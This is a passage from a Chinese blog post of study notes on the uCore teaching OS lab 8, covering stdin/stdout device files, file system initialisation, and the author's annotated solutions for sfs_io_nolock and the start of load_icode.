vfs_add_dev<br></code></pre></div></td></tr></table></figure><p>在dev_init_stdout中完成了对stdout设备文件的初始化。即首先创建了一个inode，然后通过stdout_device_init完成对inode中的成员变量inode-&gt;__device_info进行初始：</p><p>这里的stdout设备文件实际上就是指的console外设（它其实是串口、并口和CGA的组合型外设）。这个设备文件是一个只写设备，如果读这个设备，就会出错。接下来我们看看stdout设备的相关处理过程。</p><p><strong>初始化</strong> </p><p>stdout设备文件的初始化过程主要由stdout_device_init完成，其具体实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stdout_device_init</span><span class="hljs-params">(struct device *dev)</span> </span>&#123;<br>    dev-&gt;d_blocks = <span class="hljs-number">0</span>;<br>    dev-&gt;d_blocksize = <span class="hljs-number">1</span>;<br>    dev-&gt;d_open = stdout_open;<br>    dev-&gt;d_close = stdout_close;<br>    dev-&gt;d_io = stdout_io;<br>    dev-&gt;d_ioctl = stdout_ioctl;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到，stdout_open函数完成设备文件打开工作，如果发现用户进程调用open函数的参数flags不是只写（O_WRONLY），则会报错。即<code>stdout_open(struct device *dev, uint32_t open_flags)  </code> </p><p><strong>访问操作实现</strong> </p><p>stdout_io函数完成设备的写操作工作, <strong>具体是从iobuf中一个一个字符输出到串口并口和CGA显示器上</strong>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">stdout_io</span><span class="hljs-params">(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (write) &#123;<br>        <span class="hljs-keyword">char</span> *data = iob-&gt;io_base;<br>        <span class="hljs-keyword">for</span> (; iob-&gt;io_resid != <span class="hljs-number">0</span>; iob-&gt;io_resid --) &#123;<br>            cputchar(*data ++);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到，要写的数据放在iob-&gt;io_base所指的内存区域，一直写到iob-&gt;io_resid的值为0为止。每次写操作都是通过cputchar来完成的，此函数最终将通过console外设驱动来完成把数据输出到串口、并口和CGA显示器上过程。另外，也可以注意到，如果用户想执行读操作，则stdout_io函数直接返回错误值**-**E_INVAL。</p><h4 id="stdin"><a href="#stdin" class="headerlink" title="stdin"></a>stdin</h4><p>这里的stdin设备文件实际上就是指的键盘。这个设备文件是一个只读设备，如果写这个设备，就会出错。接下来我们看看stdin设备的相关处理过程。</p><p><strong>初始化</strong> </p><p>stdin设备文件的初始化过程主要由stdin_device_init完成了主要的初始化工作，具体实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stdin_device_init</span><span class="hljs-params">(struct device *dev)</span> </span>&#123;<br>    dev-&gt;d_blocks = <span class="hljs-number">0</span>;<br>    dev-&gt;d_blocksize = <span class="hljs-number">1</span>;<br>    dev-&gt;d_open = stdin_open;<br>    dev-&gt;d_close = stdin_close;<br>    dev-&gt;d_io = stdin_io;<br>    dev-&gt;d_ioctl = stdin_ioctl;<br><span class="hljs-comment">/* 这玩意儿是一个在dev_stdin.c中的全局静态变量, </span><br><span class="hljs-comment">     * 分别是pointer_read_position and p_write_position</span><br><span class="hljs-comment">     * 如果read_pos &lt; write_pos则说明有新字符</span><br><span class="hljs-comment">    p_rpos = p_wpos = 0; </span><br><span class="hljs-comment">    wait_queue_init(wait_queue);</span><br><span class="hljs-comment">&#125;</span><br></code></pre></div></td></tr></table></figure><p>相对于stdout的初始化过程，stdin的初始化相对复杂一些，多了一个stdin_buffer缓冲区，描述缓冲区读写位置的变量p_rpos、p_wpos以及用于等待缓冲区的等待队列wait_queue。在stdin_device_init函数的初始化中，也完成了对p_rpos、p_wpos和wait_queue的初始化。</p><p><strong>访问操作实现</strong> </p><p>stdin_io函数负责完成设备的读操作工作，具体实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">stdin_io</span><span class="hljs-params">(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!write) &#123;<br>        <span class="hljs-keyword">int</span> ret;<br>        <span class="hljs-keyword">if</span> ((ret = dev_stdin_read(iob-&gt;io_base, iob-&gt;io_resid)) &gt; <span class="hljs-number">0</span>) &#123;<br>            iob-&gt;io_resid -= ret;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到，如果是写操作，则stdin_io函数直接报错返回。所以这也进一步说明了此设备文件是只读文件。如果此读操作，则此函数进一步调用dev_stdin_read函数完成对键盘设备的读入操作。dev_stdin_read函数的实现相对复杂一些，主要的流程如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">dev_stdin_read</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<br>        <span class="hljs-keyword">for</span> (; ret &lt; len; ret ++, p_rpos ++) &#123;<br>        try_again:<br>            <span class="hljs-keyword">if</span> (p_rpos &lt; p_wpos) &#123; <br>                *buf ++ = stdin_buffer[p_rpos % stdin_BUFSIZE];<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//没有新字符就要进行睡眠并且调度</span><br>                <span class="hljs-keyword">wait_t</span> __wait, *wait = &amp;__wait;<br>                wait_current_set(wait_queue, wait, WT_KBD);<br>                local_intr_restore(intr_flag);<br><br>                schedule();<br><br>                local_intr_save(intr_flag);<br>                wait_current_del(wait_queue, wait);<br>                <span class="hljs-keyword">if</span> (wait-&gt;wakeup_flags == WT_KBD) &#123;<br>                    <span class="hljs-keyword">goto</span> try_again;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在上述函数中可以看出，如果<code>p_rpos</code> &lt; <code>p_wpos</code>，则表示有键盘输入的新字符在stdin_buffer中，于是就从stdin_buffer中取出新字符放到iobuf指向的缓冲区中；如果<code>p_rpos</code> &gt;=<code>p_wpos</code>，则表明没有新字符，这样调用read用户态库函数的用户进程就需要采用等待队列的睡眠操作进入睡眠状态，等待键盘输入字符的产生。</p><p>键盘输入字符后，如何唤醒等待键盘输入的用户进程呢？回顾lab1中的外设中断处理，可以了解到，当用户敲击键盘时，会产生键盘中断，在trap_dispatch函数中，当识别出中断是键盘中断（中断号为IRQ_OFFSET + IRQ_KBD）时，会调用dev_stdin_write函数，来把字符写入到stdin_buffer中，且会通过等待队列的唤醒操作唤醒正在等待键盘输入的用户进程。</p><h3 id="文件系统初始化"><a href="#文件系统初始化" class="headerlink" title=".文件系统初始化"></a>.文件系统初始化</h3><blockquote><p>指导书写的真好, 又想复制了(</p></blockquote><p>首先看看kern_init函数，可以发现与lab7相比增加了对fs_init函数的调用。fs_init函数就是文件系统初始化的总控函数，它进一步调用了虚拟文件系统初始化函数vfs_init，与文件相关的设备初始化函数dev_init和Simple FS文件系统的初始化函数sfs_init。这三个初始化函数联合在一起，协同完成了整个虚拟文件系统、SFS文件系统和文件系统对应的设备（键盘、串口、磁盘）的初始化工作。其函数调用关系图如下所示：</p><p><img src="../../image/ucore/image-20220107165956521.png" alt="image-20220107165956521"></p><p>参考上图，并结合源码分析，可大致了解到文件系统的整个初始化流程。</p><ul><li>vfs_init主要建立了一个device list双向链表vdev_list，为后续具体设备（键盘、串口、磁盘）以文件的形式呈现建立查找访问通道。</li><li>dev_init函数通过进一步调用disk0/stdin/stdout_device_init完成对具体设备的初始化，把它们抽象成一个设备文件，并建立对应的inode数据结构，最后把它们链入到vdev_list中。这样通过虚拟文件系统就可以方便地以文件的形式访问这些设备了。</li><li>sfs_init是完成对Simple FS的初始化工作，并把此实例文件系统挂在虚拟文件系统中，从而让ucore的其他部分能够通过访问虚拟文件系统的接口来进一步访问到SFS实例文件系统。</li></ul><h2 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-5"><a href="#练习1-5" class="headerlink" title="练习1"></a>练习1</h3><h4 id="openfile"><a href="#openfile" class="headerlink" title="openfile"></a>openfile</h4><blockquote><p>发现没有讲到的路径格式: </p><ul><li><p>device:/path  </p>  <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/** 或者:</span><br><span class="hljs-comment">* we have either /path or :path</span><br><span class="hljs-comment">* /path is a path relative to the root of the &quot;boot filesystem&quot;</span><br><span class="hljs-comment">* :path is a path relative to the root of the current filesystem</span><br><span class="hljs-comment">* */</span><br></code></pre></div></td></tr></table></figure></li></ul></blockquote><p>首先贴一张函数调用图:</p><p><img src="../../image/ucore/Calls-file_open.png" alt="Calls-file_open"></p><p>基本上都有多路分支, 具体可以看源码, 这里讲个大概.</p><ul><li><p>通过用户libc库中的syscall调用sys_open, 一直到中断处理转到file_open.</p></li><li><p>这个函数就执行一个简单检查以及调用了vfs_open(最重要的函数)</p></li><li><p>如果一切正常, 只会执行vfs_lookup. </p><ul><li><p>第一个get_device是解析路径的, 如果path没有指定设备名称说明只是一个相对路径, 就会执行vfs_getdir</p></li><li><p>然后会调用sfs_lookup(通过宏定义), 通过path找到对应的inode, 下面是他的调用图</p><p><img src="../../image/ucore/image-20220108132923299.png" alt="image-20220108132923299"></p></li></ul></li></ul><h4 id="read-write-file"><a href="#read-write-file" class="headerlink" title="[read,write]file"></a>[read,write]file</h4><p>调用关系如下:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">sys_fileread-&gt;file_read-&gt;vop_read(sfs_read)-&gt;sfs_io<br></code></pre></div></td></tr></table></figure><ul><li>在<code>sysfile_read</code>里设置了一个4KB的buff, 主要调用了file_read函数将文件中的内容读取到buff中</li><li>file_read改变file结构体的文件计数以及移动文件指针, 继续调用sfs_read-&gt;sfs_io(sfs_inode.c)</li><li>sfs_io通过第三个参数来判断是读还是写, 接着调用sfs_io_nolock</li><li>接下来就是练习的内容, read different kind of blocks in file</li></ul><blockquote><p>struct fs 包装了sfs_fs和一些对sfs_fs的操作</p><p>这种规模的代码我只能去理解了, 暂时没法想象要怎么构建这样大的一个工程</p><p>代码分析了一遍, 而且肖佬写的那几个部分都看过了, 实在是不想写那么多, 想看直接看现成的吧…[<a href="https://kiprey.github.io/2020/09/uCore-8/#9-uCore%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%9E%E7%8E%B0">link</a>]</p></blockquote><p>基本看懂了, 写了一堆注释在源代码里面.(<code>sfs_inode.c:595</code>)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*  </span><br><span class="hljs-comment"> * sfs_io_nolock - Rd/Wr a file content from offset position to offset+length disk blocks&lt;--&gt;buffer (in memroy)</span><br><span class="hljs-comment"> * @sfs:      sfs file system</span><br><span class="hljs-comment"> * @sin:      sfs inode in memory</span><br><span class="hljs-comment"> * @buf:      the buffer Rd/Wr</span><br><span class="hljs-comment"> * @offset:   the offset of file</span><br><span class="hljs-comment"> * @alenp:    the length need to read (is a pointer). and will RETURN the really Rd/Wr lenght</span><br><span class="hljs-comment"> * @write:    BOOL, 0 read, 1 write</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sfs_io_nolock</span><span class="hljs-params">(struct sfs_fs *sfs, struct sfs_inode *<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">off_t</span> offset, <span class="hljs-keyword">size_t</span> *alenp, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> *<span class="hljs-title">din</span> =</span> <span class="hljs-built_in">sin</span>-&gt;din;<br>    assert(din-&gt;type != SFS_TYPE_DIR);<br>    <span class="hljs-keyword">off_t</span> endpos = offset + *alenp, blkoff;<span class="hljs-comment">///endpos感觉恒等于4KB??好像不是</span><br>    *alenp = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// calculate the Rd/Wr end position</span><br>    <span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span> || offset &gt;= SFS_MAX_FILE_SIZE || offset &gt; endpos) &#123;<br>        <span class="hljs-keyword">return</span> -E_INVAL;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (offset == endpos) &#123;<span class="hljs-comment">///这是怎么发生的?</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (endpos &gt; SFS_MAX_FILE_SIZE) &#123;<br>        endpos = SFS_MAX_FILE_SIZE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!write) &#123;<span class="hljs-comment">///如果是read</span><br>        <span class="hljs-keyword">if</span> (offset &gt;= din-&gt;size) &#123;<span class="hljs-comment">///读完文件了</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (endpos &gt; din-&gt;size) &#123;<span class="hljs-comment">///不用读那么长, 只要din-&gt;size即可</span><br>            endpos = din-&gt;size;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">///下面这几行又是什么神奇操作, 这通用接口写的也太绝了</span><br>    <span class="hljs-keyword">int</span> (*sfs_buf_op)(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset);<br>    <span class="hljs-keyword">int</span> (*sfs_block_op)(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks);<br>    <span class="hljs-keyword">if</span> (write) &#123;<br>        sfs_buf_op = sfs_wbuf, sfs_block_op = sfs_wblock;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">///如果是read, 要换成 把1个block读到buf 和 把多个block读到buf</span><br>        sfs_buf_op = sfs_rbuf, sfs_block_op = sfs_rblock;<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">size_t</span> size, alen = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">uint32_t</span> ino; <span class="hljs-comment">//the pointer of inode</span><br>    <span class="hljs-keyword">uint32_t</span> blkno = offset / SFS_BLKSIZE;          <span class="hljs-comment">// The NO. of Rd/Wr begin block ///BUFFER不都是4KB的吗??</span><br>    <span class="hljs-keyword">uint32_t</span> nblks = endpos / SFS_BLKSIZE - blkno;  <span class="hljs-comment">// The size of Rd/Wr blocks</span><br><br>  <span class="hljs-comment">//LAB8:EXERCISE1 YOUR CODE HINT: call sfs_bmap_load_nolock, sfs_rbuf, sfs_rblock,etc. read different kind of blocks in file</span><br>    <span class="hljs-keyword">if</span> ((blkoff = offset % SFS_BLKSIZE) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///如果在offset起始block的中间</span><br>        size = (nblks != <span class="hljs-number">0</span>) ? (SFS_BLKSIZE - blkoff) : (endpos - offset);<br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///取出inode编号, 也即block编号</span><br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, blkoff)) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///从block和其他信息读取到buf中</span><br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size;<span class="hljs-comment">///要增加alen</span><br>        <span class="hljs-keyword">if</span> (nblks == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///如果只有一个block, 读/写就完成了</span><br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        buf += size, blkno++, nblks--;<span class="hljs-comment">///否则修改一下剩余的参数</span><br>    &#125;<br><br>    size = SFS_BLKSIZE;<span class="hljs-comment">///使用while循环, 逐block读取, 到了剩余的整个block(nblock)等于0的时候退出</span><br>    <span class="hljs-keyword">while</span> (nblks != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_block_op(sfs, buf, ino, <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size, buf += size, blkno++, nblks--;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((size = endpos % SFS_BLKSIZE) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///读取最后一个block的部分区域, 这三部分基本相同只能说</span><br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size;<br>    &#125;<br>out:<br>    *alenp = alen;<span class="hljs-comment">///上面要完成alen的赋值, 即真实的读取字节数目</span><br>    <span class="hljs-keyword">if</span> (offset + alen &gt; <span class="hljs-built_in">sin</span>-&gt;din-&gt;size) &#123;<span class="hljs-comment">///好像是用于write的</span><br>        <span class="hljs-built_in">sin</span>-&gt;din-&gt;size = offset + alen;<br>        <span class="hljs-built_in">sin</span>-&gt;dirty = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p class="note note-primary" style="font-style:italic;background-color:rgb(240,230,250)">”UNIX的PIPE机制“的概要设计方案 </p><p>?</p><h3 id="练习2-5"><a href="#练习2-5" class="headerlink" title="练习2"></a>练习2</h3><p>fork机制在原先lab7的基础上，多了<code>file_struct</code>结构的复制操作与执行失败时的重置操作。这两部操作分别需要调用<code>copy_files</code>和<code>put_files</code>函数</p><p><code>load_icode</code>中比较重要的是<code>load_icode_read()</code>, 可以根据ELF文件的特点使用偏移来移动当前文件的指针pos, 并且把内容读取到参数buf指向的空间中.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">load_icode</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **kargv)</span> </span>&#123;<br>    <span class="hljs-comment">/* LAB8:EXERCISE2 YOUR CODE  HINT:how to load the file with handler fd  in to process&#x27;s memory? how to setup argc/argv?</span><br><span class="hljs-comment">     * MACROs or Functions:</span><br><span class="hljs-comment">     *  mm_create        - create a mm</span><br><span class="hljs-comment">     *  setup_pgdir      - setup pgdir in mm</span><br><span class="hljs-comment">     *  load_icode_read  - read raw data content of program file</span><br><span class="hljs-comment">     *  mm_map           - build new vma</span><br><span class="hljs-comment">     *  pgdir_alloc_page - allocate new memory for  TEXT/DATA/BSS/stack parts</span><br><span class="hljs-comment">     *  lcr3             - update Page Directory Addr Register -- CR3</span><br><span class="hljs-comment">     */</span><br><span class="hljs-comment">/* (1) create a new mm for current 